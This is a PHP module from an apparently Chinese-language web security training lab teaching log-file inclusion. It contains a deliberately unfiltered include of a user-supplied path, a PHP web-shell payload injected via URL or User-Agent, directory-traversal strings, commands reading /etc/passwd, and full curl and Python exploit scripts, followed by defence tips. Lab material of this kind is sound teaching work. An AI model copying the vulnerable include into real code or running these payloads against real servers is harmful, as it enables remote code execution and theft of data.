<?php
// 日志包含漏洞
$module_name = '日志包含';
$module_icon = '📋';
$module_desc = '通过包含服务器日志文件来获取Shell。';

// 漏洞代码
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // 漏洞：直接包含用户输入的文件路径，没有过滤
    include $file;
}

// 页面内容 - 使用HEREDOC语法避免转义问题
$content = <<<HTML
    <div class="card">
        <div class="card-header">
            <h5 class="mb-0">📋 日志包含漏洞</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-warning">
                <strong>💡 漏洞说明：</strong><br>
                日志包含漏洞允许攻击者通过包含服务器日志文件来执行PHP代码。<br>
                当攻击者向服务器发送包含PHP代码的请求时，这些代码会被记录到日志文件中，然后通过文件包含漏洞执行。
            </div>
            
            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset(\$_GET['file'])) {
    \$file = \$_GET['file'];
    // 漏洞：直接包含用户输入的文件路径，没有过滤
    include \$file;
}</code></pre>
                </div>
            </div>
            
            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击步骤详解</h6>
                </div>
                <div class="card-body">
                    <div class="mb-4">
                        <h6 class="text-primary">步骤1：向服务器发送包含PHP代码的请求</h6>
                        <p>攻击者需要在URL或User-Agent中注入PHP代码，这样代码会被记录到访问日志中。</p>
                        <div class="alert alert-light border">
                            <strong>方法1 - URL注入：</strong><br>
                            <code>GET /zhaosec/lfi/log_include.php?<strong>&lt;?php system(\$_GET['cmd']); ?&gt;</strong> HTTP/1.1</code><br><br>
                            <strong>方法2 - User-Agent注入：</strong><br>
                            <pre class="bg-light p-2"><code>GET /zhaosec/lfi/log_include.php HTTP/1.1
Host: localhost
User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;</code></pre>
                        </div>
                    </div>

                    <div class="mb-4">
                        <h6 class="text-primary">步骤2：找到服务器日志文件的位置</h6>
                        <p>根据服务器类型和配置，日志文件可能位于不同位置：</p>
                        <div class="table-responsive">
                            <table class="table table-bordered table-sm">
                                <thead class="table-light">
                                    <tr>
                                        <th>服务器类型</th>
                                        <th>访问日志路径</th>
                                        <th>错误日志路径</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>Apache (Linux)</td>
                                        <td><code>/var/log/apache2/access.log</code><br><code>/var/log/httpd/access_log</code></td>
                                        <td><code>/var/log/apache2/error.log</code></td>
                                    </tr>
                                    <tr>
                                        <td>Nginx (Linux)</td>
                                        <td><code>/var/log/nginx/access.log</code></td>
                                        <td><code>/var/log/nginx/error.log</code></td>
                                    </tr>
                                    <tr>
                                        <td>Apache (Windows)</td>
                                        <td><code>C:/Apache24/logs/access.log</code></td>
                                        <td><code>C:/Apache24/logs/error.log</code></td>
                                    </tr>
                                    <tr>
                                        <td>PHPStudy</td>
                                        <td><code>../Extensions/Apache2.4.39/logs/access.log</code></td>
                                        <td><code>../Extensions/Apache2.4.39/logs/error.log</code></td>
                                    </tr>
                                    <tr>
                                        <td>XAMPP</td>
                                        <td><code>C:/xampp/apache/logs/access.log</code></td>
                                        <td><code>C:/xampp/apache/logs/error.log</code></td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>

                    <div class="mb-4">
                        <h6 class="text-primary">步骤3：通过文件包含漏洞包含日志文件</h6>
                        <p>利用文件包含漏洞，将日志文件作为参数传入：</p>
                        <div class="alert alert-light border">
                            <strong>包含Apache访问日志：</strong><br>
                            <code>?file=/var/log/apache2/access.log</code><br><br>
                            <strong>使用目录穿越包含日志：</strong><br>
                            <code>?file=../../../../../../../var/log/apache2/access.log</code><br><br>
                            <strong>包含PHPStudy日志（相对路径）：</strong><br>
                            <code>?file=../../Extensions/Apache2.4.39/logs/access.log</code>
                        </div>
                    </div>

                    <div class="mb-4">
                        <h6 class="text-primary">步骤4：执行日志中的PHP代码</h6>
                        <p>当日志文件被包含时，其中记录的PHP代码会被执行。此时可以通过添加cmd参数来执行任意命令：</p>
                        <div class="alert alert-light border">
                            <strong>执行系统命令：</strong><br>
                            <code>?file=/var/log/apache2/access.log<strong>&amp;cmd=whoami</strong></code><br><br>
                            <strong>查看当前目录：</strong><br>
                            <code>?file=/var/log/apache2/access.log<strong>&amp;cmd=ls -la</strong></code><br><br>
                            <strong>读取敏感文件：</strong><br>
                            <code>?file=/var/log/apache2/access.log<strong>&amp;cmd=cat /etc/passwd</strong></code>
                        </div>
                    </div>

                    <div class="alert alert-warning">
                        <strong>⚠️ 注意事项：</strong>
                        <ul class="mb-0">
                            <li>日志文件通常很大，包含大量请求记录，可能需要多次尝试才能找到注入的代码</li>
                            <li>某些服务器配置会转义或过滤特殊字符，导致注入失败</li>
                            <li>日志文件权限可能限制web服务器读取</li>
                            <li>日志轮转可能导致文件路径变化</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 完整攻击示例</h6>
                </div>
                <div class="card-body">
                    <h6 class="text-success">示例1：使用Burp Suite修改User-Agent</h6>
                    <ol>
                        <li>拦截正常请求</li>
                        <li>将User-Agent修改为：<code>&lt;?php system(\$_GET['cmd']); ?&gt;</code></li>
                        <li>发送请求，代码被记录到日志</li>
                        <li>访问：<code>?file=/var/log/apache2/access.log&amp;cmd=whoami</code></li>
                    </ol>

                    <h6 class="text-success mt-4">示例2：使用curl命令行工具</h6>
                    <pre class="bg-dark text-light p-3 rounded"><code># 步骤1：注入PHP代码到日志（通过User-Agent）
curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target.com/lfi/log_include.php

# 步骤2：包含日志文件并执行命令
curl "http://target.com/lfi/log_include.php?file=/var/log/apache2/access.log&amp;cmd=whoami"

# 步骤3：获取flag或敏感信息
curl "http://target.com/lfi/log_include.php?file=/var/log/apache2/access.log&amp;cmd=cat /flag.txt"</code></pre>

                    <h6 class="text-success mt-4">示例3：使用Python脚本自动化</h6>
                    <pre class="bg-dark text-light p-3 rounded"><code>import requests

# 配置
target = "http://target.com/lfi/log_include.php"
log_path = "/var/log/apache2/access.log"

# 步骤1：注入PHP代码
headers = {
    "User-Agent": "&lt;?php system(\$_GET['cmd']); ?&gt;"
}
requests.get(target, headers=headers)

# 步骤2：执行命令
command = "whoami"
url = f"{target}?file={log_path}&amp;cmd={command}"
response = requests.get(url)
print(response.text)</code></pre>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li>对用户输入进行严格过滤和验证</li>
                        <li>使用白名单机制，只允许包含指定的文件</li>
                        <li>设置日志文件的权限，防止被web服务器读取</li>
                        <li>定期清理日志文件</li>
                        <li>使用绝对路径包含文件</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
HTML;

// 包含模板
include '../template/module_template.php';
?>